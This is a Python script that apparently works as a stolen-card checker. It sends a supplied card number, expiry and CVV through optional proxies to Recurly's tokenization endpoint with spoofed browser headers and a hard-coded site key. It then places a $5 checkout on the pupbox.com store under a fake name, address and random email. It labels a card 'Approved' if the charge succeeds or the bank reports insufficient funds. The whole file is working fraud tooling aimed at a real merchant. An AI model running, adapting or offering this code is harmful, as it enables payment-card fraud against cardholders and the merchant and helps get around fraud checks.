import requests
import uuid

def recurlyccn5(cc, mes, ano, cvv, proxyg):
    
    session = requests.Session()
    if proxyg:
        if isinstance(proxyg, dict):
            session.proxies.update(proxyg)
        else:
            session.proxies.update({
                'http': proxyg,
                'https': proxyg,
            })
        session.trust_env = False
    
    email = f"{uuid.uuid4()}@gmail.com"
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://api.recurly.com',
        'priority': 'u=1, i',
        'referer': 'https://api.recurly.com/js/v1/field.html',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'none',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    }
    
    data = f'first_name=John&last_name=Smith&country=US&postal_code=10081&number={cc}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-US&browser[referrer_url]=https%3A%2F%2Fwww.pupbox.com%2Fcheckout&browser[screen_height]=1050&browser[screen_width]=1680&browser[time_zone_offset]=240&browser[user_agent]=Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F147.0.0.0%20Safari%2F537.36&month={mes}&year={ano}&cvv={cvv}&version=4.42.1&key=ewr1-SVjwyaSF4of0LquOF0PxlF&deviceId=DbGAre71BlsFobgN&sessionId=lg0YkXE5q5sCWIfC&instanceId=0E6ho852h8J6i1VW'
    
    req1 = session.post('https://api.recurly.com/js/v1/token', headers=headers, data=data, timeout=30)
    if req1.status_code == 429 or 'too many requests' in req1.text.lower():
        return "Declined ❌", "Too many requests. Please try again later."
    if not req1.ok:
        return "Declined ❌", f"Token request failed: {req1.status_code}"

    try:
        token = req1.json().get('id')
    except ValueError:
        return "Declined ❌", f"Token parse failed: {req1.text[:200]}"
    if not token:
        return "Declined ❌", f"Token missing: {req1.text[:200]}"
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.pupbox.com',
        'priority': 'u=1, i',
        'referer': 'https://www.pupbox.com/checkout',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        # 'cookie': 'PHPSESSID=666fee628218df5934721243c6874dd1; rpr_puppy_name=Light; cart=%5B%7B%22id%22%3A%22440988%22%2C%22href%22%3A%22viv-bubbie-halloween-skeleton-bandana%22%2C%22qty%22%3A%221%22%7D%5D; AWSALBTG=ipkBitsjM1qvEy0+v1LVaGoyndU6yYOMarlXhXlcOVTgQOiyLdhW0/rbUM3MDkxma0/PRxuQmuQrPI3lcPZ8QQ9EIbgcuVR+vHdO5wNF3ekrKKmurbWbreId9HdBehyxJvPHWy6Ar2xIPrUDjHktVnNqyIg6yZUFRrWZsQCsBgRchHgCfq0=; AWSALBTGCORS=ipkBitsjM1qvEy0+v1LVaGoyndU6yYOMarlXhXlcOVTgQOiyLdhW0/rbUM3MDkxma0/PRxuQmuQrPI3lcPZ8QQ9EIbgcuVR+vHdO5wNF3ekrKKmurbWbreId9HdBehyxJvPHWy6Ar2xIPrUDjHktVnNqyIg6yZUFRrWZsQCsBgRchHgCfq0=',
    }
    
    data = f'person=John%20Smith&email={email}&address1=Street%20385&city=NY&state=NY&zip=10081&country=US&shipping_method=standard&cc_token={token}&cart[0][id]=440988&cart[0][href]=viv-bubbie-halloween-skeleton-bandana&cart[0][qty]=1'
    req2 = session.post('https://www.pupbox.com/ajax.php?cmd=shop-checkout', headers=headers, data=data, timeout=30)
    if req2.status_code == 429 or 'too many requests' in req2.text.lower():
        return "Declined ❌", "Too many requests. Please try again later."
    if not req2.ok:
        return "Declined ❌", f"Checkout request failed: {req2.status_code}"

    if "wooId" in req2.text:
        status = "Approved ✅"
        mensaje = "Charged $5.00"
    else:
        mensaje = req2.text.strip('{"error":"').strip('","clear":[]}')
        if "Insufficient funds" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"
    return status, mensaje